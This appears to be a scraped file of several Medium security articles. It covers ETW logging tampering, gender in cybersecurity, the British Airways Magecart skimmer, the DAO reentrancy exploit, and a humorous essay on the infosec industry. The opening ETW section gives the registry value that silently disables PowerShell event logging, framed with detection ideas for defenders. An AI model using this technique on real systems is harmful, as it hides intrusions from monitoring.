Tampering category: Persistent, requiring rebootMinimum permissions required: AdministratorDetection artifacts: Registry value modification: HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\AUTOLOGGER_NAME\{PROVIDER_GUID} - EnableProperty (REG_DWORD)Description: This technique involves alerting the Enable keyword of an autologger session. For example, by default, all ETW provider entries in the EventLog-Application autologger session are set to 0x41 which translates to EVENT_ENABLE_PROPERTY_SID and EVENT_ENABLE_PROPERTY_ENABLE_KEYWORD_0. EVENT_ENABLE_PROPERTY_ENABLE_KEYWORD_0 is not documented; it specifies that any events generated for a provider should be logged even if the keyword value is set to 0. An attacker could swap out EVENT_ENABLE_PROPERTY_ENABLE_KEYWORD_0 for EVENT_ENABLE_PROPERTY_IGNORE_KEYWORD_0, resulting in a value of 0x11, which would result in all events where the keyword is 0 to not be logged. For example, PowerShell eventing supplies a 0 keyword value with its events, resulting in no logging to the PowerShell event log.Example: The following PowerShell code disables Microsoft-Windows-PowerShell event logging:
In the above example, A0C1853B-5C40-4B15-8766-3CF1C58F985A refers to the Microsoft-Windows-PowerShell ETW provider. This command will end up setting HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\EnableProperty to 0x11. Upon rebooting, events will cease to be reported to the PowerShell event log. An attacker is not constrained to using just the Set-EtwTraceProvider cmdlet to carry out this attack. An attacker could just modify the value directly in the registry. Set-EtwTraceProvider offers a convenient autologger configuration abstraction.Alternative detection artifacts/ideas: If possible, it is advisable to monitor for modifications of values within the HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\AUTOLOGGER_NAME\{PROVIDER_GUID} registry key. Note that modifying EnableProperty is just one specific example and that an attacker can alter ETW providers in other ways, too.
Tampering category: EphemeralMinimum permissions required: SYSTEMDetection artifacts: Unfortunately, no file, registry, or event log artifacts are associated with this event. While the technique example below indicates that logman.exe was used to perform the attack, an attacker can obfuscate their techniques by using Win32 APIs directly, WMI, DCOM, PowerShell, etc. Description: This technique involves removing an ETW provider from a trace session, cutting off its ability to supply a targeted event log with events until a reboot occurs, or until the attacker restores the provider. While an attacker must have SYSTEM privileges to perform this attack, it is unlikely that defenders will notice such an attack if they rely on event logs for threat detection. Example: The following PowerShell code immediately disables Microsoft-Windows-PowerShell event logging until a reboot occurs or the attacker restores the ETW provider:
Alternative detection artifacts/ideas:
Identifying blind spots and assumptions in Alerting and Detection Strategies is a crucial step in ensuring the resilience of detections. Since ETW is at the core of the event logging infrastructure, gaining an in-depth understanding of ETW tampering attacks is a valuable way to increase the integrity of security-related data sources.
Matt G.
Written by
","['Engineering & Technology', 'Company & Culture', 'About', 'Palantir.com', 'registered manifest', 'here', 'here', 'TdhEnumerateProviderFilters', 'here', 'Message Compiler', 'here', 'autologger', 'ETW — Overview', 'Event Tracing', 'TraceLogging', 'Palantirtech', 'Infosec', 'Windows', 'Incident Response', 'Cybersecurity']"
That Girly Touch: Why many attempts to attract women to cybersecurity might actually achieve the opposite,https://medium.com/storro-blog/that-girly-touch-why-many-attempts-to-attract-women-to-cybersecurity-might-actually-achieve-the-a733a894308d?source=tag_archive---------9-----------------------,"The problem is familiar. Cybersecurity still is a male-dominated field. Women make up only 10% of the global cybersecurity workforce. The field is missing out on a lot of capable people and women are missing out on an interesting, well-paid career path. There have been numerous initiatives trying to change the situation, but fighting existing stereotypes has proven to be hard.
The underlying problem: society still views technology as a ‘boy thing’. Boys are the inventors, the hackers, the tinkerers. We don’t expect girls to have the same interest in building the cool stuff. They are expected to be better at soft skills like empathy, talking and feelings.
These expectations still drive girls toward people-focused careers and away from science and technology, despite all efforts.
Or perhaps, ‘despite’ isn’t the right word here…
There are several articles that aim to get girls interested in a career in cybersecurity. But even those articles can’t avoid that tech-avoidant girly girl stereotype from popping up from time to time.
It is very telling that the tech part is often assumed to be the ‘bad’ part. It is the part that needs to be sugarcoated somehow. Yes, it is somewhat reluctantly admitted that the field has its roots in technology. But these roots are to blame for the field’s poor reputation. The articles try to lure attention away from this ‘bad’ part by repeating over and over again that the field is so much more than ‘just tech’.
Boys are the inventors, the hackers, the tinkerers. We don’t expect girls to have the same interest in building the cool stuff
They keep going on about how the field needs to broaden its definition beyond the technical domain and that it is such a misconception to think that cybersecurity is only about keeping information and computers safe. Girls shouldn’t think that the domain is highly technically focused. They must know that cybersecurity is so much more than ‘hacking and passwords’. It is a multidisciplinary field, and if you don’t like tech, there are plenty of non-technical areas to go into as well! And don’t worry; you don’t really need a technical background or technical skills to get a job in cybersecurity.
Looking for tech skills and technical qualifications in cyber candidates is condemned as a bad practice. It ’puts women off’ and even ‘naturally excludes’ them. Girls and tech don’t mix very well, apparently.
Next to the assumption that you’ll have to downplay the tech part in a career in order to sell it to women, there is the assumption that women will be naturally attracted by the ‘people part’. This is the part that gets advertised as a strong selling point.
These articles point out how professionals in cybersecurity have to deal with all kinds of different people. They argue how important it is to know a thing or two about business and organizational psychology. They stress the field’s connection with fields like behavioral science and politics. And they discuss the need for people who can serve as translators and bridge-builders. That’s where the girls come in, with their naturally superior soft skills as ‘strong communicators and collaborators’.
This is not to downplay the importance of the ‘people part’ in cybersecurity. It is just as important as the tech part. But it is very typical that in articles aimed at women, it’s this people part that gets emphasized over the tech part. This echoes existing stereotypes of tech-avoidant people-oriented females versus technical, tinkering males.
There is the assumption that women will be naturally attracted by the ‘people part’
A lot of the opinions expressed in those articles come from women in cybersecurity themselves. But women can have gender prejudices too. These societal expectations are deeply ingrained in us all. And as this blog post shows, it is hard to fight them, even with the best of intentions.
But what if the writers of those articles have intentionally sugarcoated the tech bits? What if they know that that is the only way to get their message across? What if too much talk about tech really does scare the girls away?
The people interviewed in those articles have years of experience as an expert in the field. If there is anybody who knows what works and what doesn’t, it’s them. And probably, they’re right. Emphasizing all the different and interesting social aspects of the field is more likely to draw girls’ attention than talking about technical challenges.
But this preference is, for a large part, the result of the subtle (and not so subtle) messages society keeps sending to girls: You’re a helper, not a tinkerer. A message this kind of article keeps reinforcing.
What if too much talk about tech really does scare the girls away?
As long as this keeps happening, things are not going to get any better. If girls keep seeing themselves as non-tech people persons first, they are less likely to choose a career in cybersecurity. Cybersecurity might be broad and multidisciplinary, but it is still a tech field. You work with tech people and you get to deal with tech-related issues. Why go into a tech field when your natural talents lie in an entirely different domain? Not even cybersecurity’s bright career prospects seem enough to change women’s minds about this.
If the field really wants to get more diverse, playing into existing preferences (and reinforcing them) isn’t enough. It’s those preferences themselves that need to be changed. Of course, that is going to be a hell of a job. But unfortunately, no one said that changing the world was going to be easy…
What do you think? Is it realistic to expect those preferences to change anytime soon? Or should the cybersecurity field accept gender preferences as they are today and play into those preferences in order to attract a more diverse workforce?
Like what you read? For more informative and thought-provoking pieces about cybersecurity, subscribe to our blog now!
Written by
","['Tech', 'Cybersecurity', 'Gender']"
The British Airways Hack: JavaScript Weakness Pin-pointed Through Time-lining,https://medium.com/asecuritysite-when-bob-met-alice/the-british-airways-hack-javascript-weakness-pin-pointed-through-time-lining-dd0c2dbc7b50?source=tag_archive---------5-----------------------,"A few years ago I predicted that JavaScript would soon be a dead language as it has fossilized itself and was just so clunky to use. How wrong could I have been, in that it now rules the roost in terms of making Web pages more dynamic. But it is now opening up holes on the Internet, and it is suspected that it was behind the British Airways hack.
There was great speculation that the hack had been caused by JavaScript, as the company defined that they did not store CVV numbers, but released a statement after the initial incident report to say that they could have been involved in the data capture. This pointed towards a JavaScript injection attack, and where over 3 80,000 credit card details could have been breached.
The research team at RiskIQ found the clues to the JavaScript injection by noting the time frame of the hack, and then noticed that the modernizr-2.6.2.js file had been changed just two hours before the start of the date of the breach defined in the British Airways press release (20:49 GMT, 21 August, 2018). This file had not been changed since 2012.
It is thought that the Magecart hacking group had added just 21 lines of code to the file, and where the ba.com site was a heavy usage of JavaScript.H ere we can see the integration of Modernizr [code]:
It is likely that the hackers had access to the BA.com site, and modified the code to insert a backdoor.
Modernizr is a JavaScript library for enhanced interaction, but was modified to capture data from the payment form, and send the data onto a server located in Romania. The code itself was built on the standard code:
Overall the hackers modified the modernizr-2.6.2.min.js script so that it captured a mouse event, and then gathered the form data and sent it to baways.com (and where it even had a digital certificate on the site):
Both the mobile app and the Web pages used this back-end JavaScript, and thus both were compromised. X-option headers and CSP code integration are one way to enhance the detection of code injection, but, unfortunately, the ba.com site achieves a lowly D grade on its integration of these methods [scan] with only iframe injection being detected:
The Magecart group have also been pin-pointed, too, for a recent hack on Ticketmaster, and which was reported on Wednesday 27 June 2018. It affected around 40,000 users, and included credit card payment data, addresses, name and phone numbers.
The detection of the breach was on 23 June 2018, and within dates of the announcement, there were already reports of users being scammed. Every user on the site was then advised to change their password, if they used the same password on other sites. This worried many, as Ticketmaster were hinting that their hashing method used to store password could have been crackable.
It is likely that the breach had been occurring for several months, and it was detected by a third party (Monzo). Monzo have since defined that they detected the frauds on 6 April 2018, and where around 70% of its users who reported a fraud, had also bought tickets (and where just less than 1% of their customers were using Ticketmaster at that time).
Monzo told Ticketmaster about this … and Ticketmaster did very little about it:
Our investigation shows no evidence of a breach, and we don’t believe we’re the source of this’ and now several months later, it comes up that they’ve been breached all this time.
But the statistics were showing that there was an extremely high probability that a hack had occurred. Monzo then issued new cards for all the affected users. The facts are that Ticketmaster had not been hacked, but it was a subcontractor: Inbenta Technologies.
Inbenta operated a chat bot and had taken some standard JavaScript code, and modified it for Ticketmaster. Ticketmaster then ran this code for a chat service, but also used it on their payments payment (without Inbenta knowing about this). Unfortunately hackers found the script and were able to modify it to harvest user data (from February 2018 onwards). Inbenta then fixed the vulnerability on 26 June 2018.
JavaScript integration has grown arms and legs, especially as we have moved more processing away from the server, and towards the browser.
Lessons learnt:
Written by
","['JavaScript', 'Hacks', 'Cybersecurity']"
The DAO of ETHEREUM: - The Blockchain Review by Intrepid - Medium,https://medium.com/blockchain-review/the-dao-of-ethereum-e228b93afc79?source=tag_archive---------3-----------------------,"They say it’s lonely at the top, in whatever you doYou always gotta watch motherfuckers around youNobody’s invincible, no plan is foolproofWe all must meet our moment of truth — Gangstar, Moment of Truth
As the title suggests, this is my attempt, or practical observation, of the current DAO situation, Ethereum, and what it means to be an to be an entrepreneur in the wider blockchain innovation space.
It came to mind, in the current debacle that’s happening, that many lessons can be learned, and that these lessons; no matter how hard they are for Slock.IT, Ethereum, and the wider blockchain ecosystem:
That in a strange way, this drama is the best thing that could happen for us all.
I’m saying this as a Miner, DAO token and Ether holder — and someone who has a deep appreciation for the Ethereum and DAO teams — but also with respect for the investors that supported the project.
My bias will lean towards the founders and technologists working in this space. Although I will try not to absolve them of any wrongdoing or incompetence, and I will place onus on the investors to understand their own financial risk tolerance, and the technology underlying their investment.
As a community, were very much like the characters in the allegorical tale “The Tao of Pooh”, I won’t get into the book, but if you decide to read it, it’s very short, you will come to see that things are as they should be, and that we all played a part in creating the situation that we have at hand — that is ongoing, fueled by panic, emotion, and competing self interests.
I include the “”Attacker”” in this as well, although he’s being villainized, he plays an important, catalyst role, in the future of Ethereum, and blockchain innovation as a whole.
This situation is complex, but so is the DAO, Ethereum and what we all want to get out of the respective projects, but in order to un-pack the current crisis we need to understand what happened and the context in which it happened in.
What happened?
The short answer is ambition, complexity, and enthusiasm.
It’s arguable, but I think few will contest, that the DAO project is one of the most revolutionary and ambitious projects in technology today.
It showcased that international crowdfunding works, as it is currently the world’s largest crowdfunded campaign in history.
It’s the Napster of finance, international law, and the nature and of work. All wrapped into one organization. The music industry was never the same after Napster.
Financial services and international law as we know it, will never be the same after the DAO.
The sheer scope of the project demands a technological rigor that only few can attempt, and a scope of knowledge that spans finance, securities, and international law. With many precedents set in a space that is nascent and has no framework for best practices.
It’s a new frontier that takes an intrepid nature to even conceive of, let alone attempt.
Whether you think a fully decentralized and autonomous organization shaped into an investment fund is a good idea or not, the challenge that the Slock.IT team and the collaboration with the people at Ethereum undertook is an endeavor of magnitude and ambition, which was what created the appeal, but at the same time baked in alot of complexity. I’d liken it to Elon musk launching his first space crafts, yes they exploded or did not land, but we all looked at it in amazement because of what he and his team was trying to do, and we supported them along the way.
Complexity is the enemy of security, and although there was multiple parties who looked at the code, some of the smartest and most accomplished security professionals and visionary technologist, getting the code right from a logical perspective, became problematic to say the least.
Ethereum
Ethereum is a revolutionary, decentralized platform, that runs smart contracts: applications that run exactly as programmed without any possibility of downtime, censorship, fraud, or third party interference.
Essentially developers can make apps that run on a custom built blockchain, an enormously powerful shared global infrastructure that can move value around and represent the ownership of property. This enables developers to create markets, store registries of debts or promises, move funds in accordance with instructions given long in the past (like a will or a futures contract) and many other things that have not been invented yet, all without a middle man or counterparty risk.
The project was crowdfunded during August 2014 by fans all around the world. It is developed by the Ethereum Foundation, a Swiss nonprofit, with contributions from great minds across the globe. [1]
The DAO
The DAO is a Decentralized Autonomous Organization (“DAO”) — more specifically, it is a new breed of human organization never before attempted. The DAO was borne from an immutable, unstoppable, and irrefutable computer code, operated entirely by its members, and fueled using ETH, the token that represents value on the Ethereum blockchain, which creates DAO tokens.
The DAO leverages smart contracts on the Ethereum blockchain so that anyone, anywhere in the world can be empowered to participate. In exchange for their early help, participants receive DAO tokens which represent ownership in the DAO and the right to vote on proposals for the funding of Ethereum blockchain applications
The DAO backs proposals, which it selects for their innovative nature, to be delivered by “Contractors”. Some of these Proposals could hold no promise of return whatsoever (in the case of a charity for example), others could involve the building of products or services which The DAO could then use for its own purposes.
The DAO charges for the use of its the products or services. This revenue is then sent directly to The DAO in the form of ETH. The DAO then has the option to accumulate this ETH to support its growth, or redistribute it to the DAO Token Holders as a reward.
The ETH held by The DAO will never be centrally managed as it is fully autonomous and lives on a section of the Ethereum blockchain.
DAO token holders are able to vote on important decisions relating to the management of The DAO, including the power to redistribute its ETH amongst themselves.[2]
The Attack
The same sheisty cats that you hang with, and do your thang withcould set you up and wet you up, nigga peep the languageIt’s universal, you play with fire it may hurt youor burn you, lessons are blessings you should learn through — Gangstar, Moment of Truth
A few days back from the date of this post 3,641,694 ETH was split from “theDAO”. The “Attacker” found a loophole in the regular “splitDAO” function so that they could reuse the same DAO tokens over and over again.
Essentially, the “”Attacker”” found a legal “loophole” in the contract code that allowed him/her to exploit the contract unilaterally.
In an open letter to the Ethereum community he wrote which is PGP signed and titled: “An Open Letter To the DAO and the Ethereum community” the “Attacker” claimed he/she had examined the code and believes the Ether drained is now legitimately his/hers.
The “Attacker” writes that people characterizing the event as “theft” are completely unjustified and that the smart contract itself has allowed this to happen. The “Attacker” writes:
“I have made use of this feature and have rightfully claimed 3,641,694 ether, and would like to thank the DAO for this reward. It is my understanding that the DAO code contains this feature to promote decentralization and encourage the creation of “child DAOs”. I am disappointed by those who are characterizing the use of this intentional feature as “theft”. I am making use of this explicitly coded feature as per the smart contract terms and my law firm has advised me that my action is fully compliant with United States criminal and tort law.”
The so-called “Attacker” also cites the written words of the binding smart contract which says,
“The terms of The DAO Creation are set forth in the smart contract code existing on the Ethereum blockchain. Nothing in this explanation of terms or in any other document or communication may modify or add any additional obligations or guarantees beyond those set forth in The DAO’s code.”
The author claims that a soft or hard fork would be considered “theft” in legitimate tort law, and he/she believes the 3.5 million plus Ether was declared legally through the terms of the smart contract.
The “Attacker” also says that changing the code in a fork-type manner will destroy the Ethereum community and confidence in the very foundations of smart contracts.
The author explains the effect that will take place if developers decide to continue with the fork solutions saying:
“A soft or hard fork would amount to seizure of my legitimate and rightful ether, claimed legally through the terms of a smart contract. Such fork would permanently and irrevocably ruin all confidence in not only Ethereum but also the in the field of smart contracts and blockchain technology. Many large Ethereum holders will dump their ether, and developers, researchers, and companies will leave Ethereum. Make no mistake: any fork, soft or hard, will further damage Ethereum and destroy its reputation and appeal.”
The unconfirmed “Attacker” concludes his/her message by saying legal action has been taken, and he/she is working with a law firm at the moment in regards to this case.
“Accomplices (developers) taking part in a freeze, hard fork, soft fork, or roll back will “be receiving Cease and Desist notices in the mail shortly.”
He continues by saying:
“I hope this event becomes a valuable learning experience for the Ethereum community and wish you all the best of luck. Yours truly, ‘The “Attacker”’
The “Attacker” managed to combine 2 exploits. The first exploit was to call the split DAO function recursively. That means the first regular call would trigger a second (irregular) call of the function and the second call would trigger another call and so on.
The following calls are done in a state before the balance of the “Attacker” is set back to 0. This would allow the “”Attacker”” to split multiple times per transaction, probably about 20–50 times. He could not do more — otherwise the transactions would have gotten too big and eventually would have reached the block limite.
The “Attacker” managed to replicate this attack from the same two addresses with the same tokens over and over again (roughly 250 times from 2 addresses each). So the “Attacker” found a second exploit that allowed to split without destroying the tokens in the main DAO.
He/She managed to transfer the tokens away before they get sent to address 0x0 and only after this they are sent back. The combination of both attacks multiplied the effect. Attack one, on its own, would have been very capital intensive (you need to bring up 1/20 of the stolen amount upfront) — the attack two would have taken a long time.
Smart Contracts and the law
The details of contract law varies depending on the jurisdiction, but yet the have a broad set of parameters that are uniform based on jurisprudence. Contracts; govern the associations between humans.
Therefore, although Ethereum and The DAO are both decentralized autonomous organizations and, to a certain extent, they seemingly float above jurisdiction and regulation; because they are on the internet, networked, and/or in the “cloud” — they can under the law, if there was a precedent for this situation, which there is not, be interpreted under “default”, (more on this) as a general partnership.
Secondly, the fascinating features about the DAO is that as it “hovers” above specific jurisdictions, it could also be subject to any jurisdiction and none, simply because the contract did not specify any jurisdiction at all, whether real or virtual
Moreover, even though the The DAO was explicit in its communication that the “code is the contract” and anything that the codes does is the default, does not mean that other laws don’t apply.
Many entrepreneurs avoid considering legal context because it’s both confusing and appears to limit choices instead of expanding them. The reality, however, is that making no choice of legal context is a choice — a choice to abide by the default law. Default laws are often counter-intuitive resulting in harsh unexpected consequences. Failure to choose is the worst choice you can make. [4]
Default laws are laws (or rules) that apply when the parties haven’t made other choices
Courts will apply these default terms whether or not the parties actually know they exist or understand them. If, however, the terms were clearly specified in the contract, the court would abide by those instead of the default rules.
Which is why, in the case of the DAO, a simple but effective remedy that could have mitigated the risks involved, in the event that they did not place the right “clause” in the code; Is a mediation and/or arbitration clause.
They are very simple and are offered in a variety of different ways to suit your needs and essentially give you the option to have your case, mediated by professionals in the space, which the courts, must uphold, provided you place this simple clause in your contracts. Here is an example of one.
“In the event of a dispute arising out of or relating to this contract, including any question regarding its existence, validity or termination, the parties shall first seek settlement of that dispute by mediation in accordance with the LCIA Mediation Rules, which Rules are deemed to be incorporated by reference into this clause.
If the dispute is not settled by mediation within […………] days of the commencement of the mediation, or such further period as the parties shall agree in writing, the dispute shall be referred to and finally resolved by arbitration under the LCIA Rules, which Rules are deemed to be incorporated by reference into this clause.
The language to be used in the mediation and in the arbitration shall be […………].
The governing law of the contract shall be the substantive law of […………].
In any arbitration commenced pursuant to this clause,
(i) the number of arbitrators shall be [one/three]; and
(ii) the seat, or legal place, of arbitration shall be [City and/or Country].”[5]
Another implication that Slock.IT, the “Attacker” and the Ethereum community face, is something known as “equitable remedies” whereby remedies that can be obtained in a breach of contract situation and in essence, remedies may be divided into two categories: legal and equitable. Legal remedies allow the non-breaching party; but according to the DAO’s own legal contract, there was nothing in the contract that did not allow the “Attacker” to create a child DAO, and be recursively rewarded in DAO tokens for doing so — and the intent is completely unimportant — the only important and relevant governance is the smart contracts themselves. Consequently, there is no real legal difference between a feature and an exploit. It is all a matter of interpretation.
To recover monetary damages, in lieu of a breach of contract, equitable remedies are actions that the court prescribes which will serve to resolve the breach or dispute. But in this particular case, because there was no jurisdiction specified, where would a case be pleaded? Or could the case be pleaded in multiple jurisdiction, if a case arose, and one that would be favourable to a plaintiff, or multiple plaintiff given that the DAO would be interpreted as a general partnership?
Equitable remedies are typically granted when legal remedies or monetary compensation cannot adequately resolve the wrongdoing. It is often a requirement that legal damages be unavailable before a court will decide to issue equitable relief. In the case of Slock.IT the category of equitable remedy that would be most favourable to them would be a “Contract Rescission” this is where the old contract which was breached is rescinded or cancelled. A new contract may be written which more clearly addresses the different needs of each party. [6]
The Blockchain and Dual Legal Integration
A process, that could have been incorporated into the DAO that would have mitigated the risks, or at least would have been able to provide mechanism for remedy if something went wrong is the concept of Dual integration. Which is the the process of integrating a specific legal contract (which can be built with Legal Markdown or any other contract building system) into a specific smart contract which runs on a distributed data store such as Ethereum, or Eris industries [7]
The idea of dual integration is to allow users to be able to have the certainty of having a real world contract which can be taken to a court and enforced using established dispute resolution processes in the jurisdiction(s) of the user(s) while also using a smart contract as the primary mechanism for administering the data-driven interaction which attends to the agreement between the parties.
For another system which is also seeking to bridge this gap see Primavera de Filippi’s Draft Legal Framework For Crypto-Ledger Transactions.[8]
The reason Eris Industries recommends to all users of Distributed Technology, and particularly smart contracts, to dual-integrate their smart contracts with real world legal contracts built by lawyers qualified in the jurisdiction(s) that will be relevant to the agreement, is simple.
Smart contracts are necessarily limited. And the fallout of the DAO is a direct showcase of how dumb smart contracts can be.
As they are, at their core, just scripts which live in a distributed data store, the pure code of a smart contract has a limited ability to “reach” outside the context of their data store to incorporate a legally-binding contractual understanding. While they are capable of being structured in a manner which would automatically administer a data-driven interaction and ensure harmony of the data set in which the smart contracts reside (if they have permissions to do so),judges are unlikely, for the foreseeable future, to be able to easily resolve disputes stemming from smart contracts solely on the basis of their coded parameters (meaning without an integrated legal contract) without simply applying the commercial defaults for the agreement in the jurisdiction — an end that is unlikely to reflect the intention of the parties to the agreement in question. For these reasons of the limited reach of smart contracts and the limited enforceability of smart contracts, we highly encourage all smart contract systems developers to utilize dual integration of some kind.
Nobody knows right now if there will be lawsuits from the $50m-plus attack the DAO, but the notion of decentralised governance is a model that will be tested, scrutinized, and debated for a long time to come.
I likened The DAO to Napster, in the sense that it created a shockwave of disruption that forever changed the landscape of music, by calling into question ownership in a peer to peer network, to exchange the title and ownership of music; and here is an example where the DAO has caused the same uproar in the financial and legal community regarding associations and legal formations in the world of cryptography.
In time, it may be that regulators and courts, or maybe even a Decentralized Arbitration and Mediation Network decide these things. I do not know quite how a court would decide this situation as I am not a lawyer, and nothing that I have written here should be construed as legal advice, but it is quite possible that in the eyes of the court, the hacker is himself is simply a legitimate operator operating in the bounds of the smart contract and it is those who are attempting to change the smart contract through soft or hard fork are in effect, violating the law.
What can be done?
Ideally, the DAO developers will find a way to extract the stolen funds without any protocol alterations (aka “hard fork”). However, such a plan, if feasible, will take time to design, test and deploy. If Slock.IT and the Ethereum team can find a way of remedying the situation through their own “attack” (DAO war), then investors will still have thier funds, the DAO can go on, in whatever capcity they feel is relevant and suitable, and the integrity of Ethereum will remain intact in the eyes of the community.
If not feasible, an alternative approach will have to be found, quite possibly a minor hard-fork of the core protocol. Either way there has to be a limit to the damage being done — the fastest, most effective way of doing this is through a temporary soft-fork.
But what if they can’t?
Since the DAO has no internal governance mechanism to reverse the alterations that have already happened, any kind of intervention to recover the stolen funds would take the form of a hard-fork: an alteration of the core Ethereum protocol.
What is a soft Fork?
A soft-fork is a minor, temporary alteration to the protocol all remnants of which can eventually be removed from the protocol with no recourse for syncing the blocks that were introduced during the period that it was in effect. Basically, it requires only the acquiescence of implementers and miners and need have no long-term repercussions, neither in terms of the code-bases nor in terms of the protocol spec.
“Parity” the lighter and faster, and more secure ethereum client, that is written with a different programming language called “Rust”, already has such a soft-fork waiting, which would lock the stolen funds, preventing them from being removed, exchanged or sold.[9]
What is a Hard Fork?
A hard fork would require longer discussion and consensus finding in the Ethereum community, but essentially it would remove all funds from the “Attackers” child DAO and move them to a to a new smart contract and would replace the contract at the main DAO with a simple refund contract with only one function. This function takes one parameter (address of childDAO), to determine a combined balance of mainDAO and childDAO and then pays back ether accordingly (in order to also pay back DAO token holders who did already split)
With this solution, 100% of the funds can be refunded, with no rollback of blocks or transactions is required.
Usually when people think about hard forks, they imagine about rollbacks of entire blocks, undoing unrelated transactions (similar to bitcoin hard forks). But in this case,the hard fork is far more elegant and easier to implement, as there is no need to roll any blocks back, or to undo any transactions that have nothing to do with the DAO.
In fact, a typical ethereum user will not feel anything from that hardfork, besides a minor client update. [10]
The Cost of Innovation and the perils of progress
“The play-it-safe pessimists of the world never accomplish much of anything, because they don’t look clearly and objectively at situations, they don’t recognize or believe in their own abilities to overcome even the smallest amount of risk.” — Benjamin Hoff, The Tao of Pooh
The DAO experiment is one of the most exciting projects in the world today, challenging the notions of international finance and governance, and testing the limits of blockchain technology. It is the very definition of entrepreneurship and an expose on innovation at it’s highest ideals.
In saying this, it is not to excuse the responsibility that comes with dealing with this powerful technology or the regulations that we have in place for financial dealings and organizations, but a testament to the spirit of entrepreneurship that progresses our society.
The notion that a small team of curious, and talented individuals can launch, from their grandmother’s house in europe, and align the focus and sentiment, of like minded individuals from around the world, to create an unmanned investment vehicle to benefit the ambitions of a community — all working on projects that might not otherwise get funded; is a showcase of courage in a world where a lot of people have ideas, and blow hard on the hype of blockchain technology, yet have nothing to show for it.
We have banks banding together to pay exorbitant amounts of money to hold hands as they jump into the shallow end of blockchain technology, while these entrepreneurs with limited resources at hand, systematically changed how we view organizations, the law and finance.
Are there problems, yes. Are there going to be mistakes. Of course. But If you know the story of Slock.IT and Etherem, both partners of a similar vision, you know that 10 months ago Ethereum was launched and it was one of the worlds largest crowdfunded projects in history raising 18m EU, for one of the world’s most revolutionary advancements in cryptography and computer science. Then 10 months later, that same group of friends banded together to out do themselves, obviously by accident, to raise another DAO worth up to 250 million USD in less than a month from launch.
As an “investor” in many of these projects, Ethereum and the DAO, I’m well aware of the risks. Anyone who dropped money into this venture, small or large, expecting a 6000% return on investment in 6 months, was deluding themselves, or was not truly assessing the risk involved in an experimental technology and investment vehicle.
Thankfully, given the sentiment that I have come across online, many did not have that intention, but to help other startups in the space progress with a technology that many do not really understand. It’s very hard to pitch these types of projects to investors unless they are knowledgeable about the space and technology, which apart from the illusory hype, is very very few people.
The DAO and Ethereum are creating ways for entrepreneurs to have the resources and the scale to realize their ideas and for this reason alone, aside from the mishap that caused the splitting of 50m USD from the DAO, this project has had far more positive intentions than negative fallout.
This technology is experimental, it’s not even a year old and it’s already provided evidence, for better or for worse, of what it can do, and we haven’t even nicked the surface of the types of applications and products that it can enable.
Ethereum, and the blockchain ecosystem is still nascent, still growing, and in its early stage of development. It’s expected that things will go wrong, it’s understood that this is the exploratory phase of growth, but without people pushing the limits of imagination and capabilities we will be stuck with the problems of old without any solutions that can remedy the impediments of our society.
The Future
“But isn’t the knowledge that comes from experience more valuable than the knowledge that doesn’t? — Benjamin Hoff, The Tao of Pooh
This situation has turned out to be the “Too big to fail” scenario that we blockchain and cryptocurrency enthusiasts have railed against in the “real world” and have pinned hopes on platforms like Ethereum and the DAO. Although this is a challenging time for the Slock.IT team and the Ethereum community, I firmly believe that the distributed vision of the future is being lead by thoughtful and considerate leaders in the community like Ethereum and Slock.IT, and that the first widely adopted Decentralized Autonomous Organization will be an amazing learning lesson and catalyst for more bold and visionary projects in the future.
Written by
","['Studio', 'blockchainreview.io', 'Blockchain', 'Ethereum', 'Thedao', 'Cybersecurity', 'Innovation']"
The day the Information Security industry turned into Metallica’s Black Album,https://medium.com/@talaarad/the-day-the-information-security-industry-turned-into-metallica-s-black-album-717a391c1919?source=tag_archive---------5-----------------------,"I’ve been working as an information security professional for too long. When I started my career I was young, handsome, blond and over 180cm. And now, I’ve become short, stocky, cynical and I hate everyone with a passion. Just look at my over dramatic profile picture and you’d see how far I’ve progressed.
During my years in the industry I’ve seen it go through various cycles. I’ve been called IT Security, I’ve been called the IT Police, I’ve been called the “Oh look it’s that guy hide your porn files delete your MP3 server” (seriously, I’ve been hearing that joke for 15 years now, you need to refresh your repertoire). In fact, during my military service there were only two people on the base that have been referred to by their job title: “The Sergeant Major” (the guy who ensures you shine your shoes) and “The OpSec Officer” (the guy who ensures you hide your porn collection).
Things got better as the industry progressed and I’ve got the ominous title of “Information Security”, signifying that I’m now allowed to look for your porn collection not just within information systems but also in your paperwork, whiteboards, lockers, kitchenettes, and your first ever Nokia brick mobile phones (and don’t we all miss them).
I’ve continued my porn-seeking career for several more years without disruption. And then it happened. The security industry turned into the Black Album.
If you’re a Metallica fan, you remember when Metallica stopped being the band that sings songs that sounded like “ROAR RIDE THE LIGHTNING DIE DIE DIE” (disclaimer: I exaggerate. Also, I happen to like Metallica) and only people that had long hair and torn jeans used to listen to them. It was when the Black Album came out, and all of a sudden “Enter Sandman” becomes the number one hit on everyone’s billboard. Metallica quickly became the mainstream heavy (or former?) heavy metal band. It was a good move for the mainstream music listeners, it was a definitely a good move for Metallica’s bank account, it was not so good for the boys with the long hair and the torn jeans (and personally I think it marked the decline of Metallica as a “proper” heavy metal band, but I digress).
And so we go into the equivalent new era for the Information Security industry. The <dramatic pause> CYBER ERA.
I’m not sure what exactly prompted the name shift from the old trusty “Information Security” to “WE DA CYBER PEOPLE”, it was probably a combination of several events. For the more Security/IT focused people it was probably the Stuxnet attack against the Iranian nuclear program, or the infamous RSA hack by (allegedly!) the Chinese government- those two (with Stuxnet probably being more prominent in this case) were possibly the first instances of real Cyber warfare; nations using computing powers to achieve military goals. For the more common folk, I’d guess it would have been the Anonymous attack against the Sony Playstation Network or the one set against Sony Entertainment by Dear Leader.
Regardless, Information Security is now dead and LONG LIVE CYBER SECURITY (or the more hype one: CYBER).
This is good you say? This is making your old cranky porn-seekers more agreeable and cool to the public who want to play nice with you?
Well, yes and no. Yes, the hype around Information/Cyber security has certainly put this profession higher on the agenda of the boards around the world, and some older-fashioned CEOs finally woke up to smell the humus information security people have been cooking for years: it’s a bad computer world out there, and it’s going to get worse. Much worse.
On the other hand, like everything becoming a hype, this also makes the industry “cheaper”, in a sense, and brings up a whole generation of CYBER WARRIORS. All of sudden, you see training centers popping all over the place offering CYBER courses. Cyber Warrior. Cyber Defender. Cyber Analyst. Cyber Cyber. Inexperienced people go into a short course, they get certified as a Cyber Cyber, and off they go into the market.
Well you say, most companies will know that these people are not qualified surely?
